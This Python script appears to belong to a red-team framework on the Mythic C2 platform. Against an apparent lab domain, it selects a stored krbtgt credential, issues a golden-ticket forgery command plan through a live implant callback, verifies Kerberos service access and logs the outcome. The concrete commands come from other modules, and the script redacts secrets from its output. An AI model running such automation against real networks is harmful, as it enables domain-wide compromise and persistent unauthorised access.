#!/usr/bin/env python3
"""Bounded live proof for deterministic Kerberos ticket/context capability execution.

No LLM is used. The script builds Sage's generic capability command plan, issues only that plan on the
selected callback, verifies service access from the relevant Kerberos context, and records ledger effects
only from that proof.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import re
import sys
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[3]
os.environ.setdefault("SAGE_ENGAGEMENT_GATE", "1")
os.environ.setdefault("SAGE_ENGAGEMENT_STATE_DIR", str(ROOT / "Payload_Type" / "sage" / ".sage_engagement"))

sys.path.insert(0, str(ROOT / "skills" / "sage-live-runner" / "scripts"))
from mythic import mythic  # noqa: E402
from sage_task import resolve_password  # noqa: E402

sys.path.insert(0, str(ROOT / "Payload_Type" / "sage" / "ai" / "langgraph"))

import capabilities  # noqa: E402
import credential_artifacts  # noqa: E402
import engagement_ledger  # noqa: E402
import mythic_tools  # noqa: E402

SERVER = "127.0.0.1"
USER = "mythic_admin"

SECRET_FLAG_RE = re.compile(r"(?i)(/(?:aes256|aes128|rc4|ntlm|krbtgt_hash):)([0-9a-f]{32,64})")
LONG_B64_RE = re.compile(r"(?<![A-Za-z0-9+/=])([A-Za-z0-9+/=]{160,})(?![A-Za-z0-9+/=])")
KEY_NAMES = {"key", "credential", "credential_text", "secret", "aes256", "aes128", "rc4", "ntlm", "krbtgt_hash"}


def _redact(value: Any) -> Any:
    if isinstance(value, dict):
        out = {}
        for key, item in value.items():
            out[key] = "<redacted>" if str(key).casefold() in KEY_NAMES and item else _redact(item)
        return out
    if isinstance(value, list):
        return [_redact(item) for item in value]
    if isinstance(value, str):
        text = SECRET_FLAG_RE.sub(lambda match: f"{match.group(1)}<redacted>", value)
        return LONG_B64_RE.sub("<redacted-base64>", text)
    return value


def _tail(value: Any, limit: int = 1400) -> str:
    return _redact(str(value or ""))[-limit:]


def _command_summary(command: dict[str, Any]) -> str:
    return json.dumps(_redact({
        "command": command.get("command"),
        "parameters": command.get("parameters"),
        "capability": command.get("capability"),
        "purpose": command.get("purpose"),
        "produces": command.get("produces"),
        "consumes": command.get("consumes"),
        "deferred": command.get("deferred"),
    }), sort_keys=True)


def _callback_payload_type(callback: dict[str, Any]) -> str:
    payload = callback.get("payload") if isinstance(callback.get("payload"), dict) else {}
    payload_type = payload.get("payloadtype") if isinstance(payload.get("payloadtype"), dict) else {}
    return str(payload_type.get("name") or callback.get("payloadtype") or "")


def _is_ticket_proof(command: dict[str, Any]) -> bool:
    return str(command.get("expected_probe") or "").casefold() == "extract_ticket_probe"


def _is_proof_achieved(output: str) -> bool:
    probe = credential_artifacts.extract_ticket_probe(output)
    return capabilities.verify_capability("forge-golden-ticket", dict(probe)).verdict == "achieved"


def _record_context_effect(tools: mythic_tools.MythicTools, domain: str, callback_id: int, task_id: Any, output: str) -> None:
    probe = dict(credential_artifacts.extract_ticket_probe(output))
    probe["callback_id"] = str(callback_id)
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target=f"domain={domain};callback={callback_id}",
        preconditions=[f"da:{domain}", f"krbtgt-hash:{domain}", f"live-callback:{callback_id}"],
        effects=[f"kerberos-context:{domain}@callback:{callback_id}"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": domain,
            "target_domain": domain,
            "source_domain": domain,
            "callback_id": str(callback_id),
        },
    )
    verification = tools.record_capability_result(
        action,
        probe,
        evidence={
            "source": "focused_ticket_context_proof",
            "provenance": "run",
            "mythic_task_id": task_id,
            "callback_id": callback_id,
            "command": "service-proof",
        },
    )
    print(f"context record verdict={verification.verdict} reason={verification.reason}")


async def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--callback", type=int, default=int(os.environ.get("APOLLO_CB", "13")))
    parser.add_argument("--domain", default="sevenkingdoms.local")
    parser.add_argument("--domain-sid", default="S-1-5-21-3033212248-4076524963-940182272")
    parser.add_argument("--domain-sid-source", default="task 450 krbtgt Object Security ID minus RID")
    parser.add_argument("--proof-host", default="kingslanding.sevenkingdoms.local")
    parser.add_argument("--timeout", type=int, default=120)
    args = parser.parse_args()

    mythic_tools.ENGAGEMENT_GATE_ENABLED = True
    client = await mythic.login(server_ip=SERVER, username=USER, password=resolve_password())
    callbacks = await mythic.get_all_active_callbacks(client)
    callback = next((item for item in callbacks if int(item.get("display_id") or 0) == args.callback), {})
    if not callback:
        print(f"ERROR: callback {args.callback} not found")
        return 1
    print(
        f"target callback: cb{args.callback} payload={_callback_payload_type(callback)} "
        f"host={callback.get('host')} user={callback.get('user')}"
    )

    tools = mythic_tools.MythicTools(agent_task_id="focused-ticket-context-proof")
    tools.client = client
    tools._resolve_domain_controller_host = lambda domain: asyncio.sleep(0, result=args.proof_host)
    await tools._ensure_engagement_key()
    print(f"engagement: {tools._eng_key()}")
    original_objective = str(engagement_ledger.load(tools._eng_key()).get("objective") or "")

    selected = await tools._select_krbtgt_credential(args.domain)
    if not selected:
        print(f"ERROR: no usable krbtgt credential in Mythic store for {args.domain}")
        return 1
    print(
        f"selected krbtgt credential: id={selected.get('id')} "
        f"key_type={selected.get('key_type')} length={len(selected.get('credential') or '')}"
    )

    raw_plan = await tools.build_capability_commands(
        {"capability": "forge-golden-ticket", "domain": args.domain},
        {
            "domain_sid": args.domain_sid,
            "domain_sid_source": args.domain_sid_source,
            "proof_host": args.proof_host,
        },
    )
    plan = json.loads(raw_plan)
    print(f"builder ok={plan.get('ok')} reason={plan.get('reason')}")
    if not plan.get("ok"):
        print(json.dumps(_redact(plan), indent=2, sort_keys=True))
        return 1

    commands = list(plan.get("commands") or [])
    print("plan commands:", ", ".join(str(command.get("command")) for command in commands))
    proof_achieved = False
    proof_task_id = None
    proof_output = ""

    for index, command in enumerate(commands, 1):
        name = str(command.get("command") or "")
        params = command.get("parameters")
        if not name:
            continue
        print(f"\n[{index}/{len(commands)}] issuing {_command_summary(command)}")
        output = await tools.issue_task_and_waitfor_task_output(name, params, args.callback, timeout=args.timeout)
        task_id = tools._last_issued_task_display_id
        print(f"task_id={task_id} output_tail:\n{_tail(output)}")
        if _is_ticket_proof(command):
            probe = credential_artifacts.extract_ticket_probe(output)
            verdict = capabilities.verify_capability("forge-golden-ticket", dict(probe)).verdict
            print(f"ticket proof verdict={verdict} probe={json.dumps(_redact(probe), sort_keys=True)}")
            if verdict == "achieved":
                proof_achieved = True
                proof_task_id = task_id
                proof_output = output
                break

    if not proof_achieved:
        print("RESULT: failed to prove ticket/context access in this bounded run")
        return 2

    _record_context_effect(tools, args.domain, args.callback, proof_task_id, proof_output)
    if original_objective:
        data = engagement_ledger.load(tools._eng_key())
        data["objective"] = original_objective
        engagement_ledger.save(data, tools._eng_key())
    print("RESULT: achieved service access proof and recorded verified effects")
    print("achieved effects:")
    for effect in sorted({effect for hop in tools._engagement_hops for effect in getattr(hop, "satisfied_effects", [])}):
        if args.domain in effect:
            print(f"- {effect}")
    return 0


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
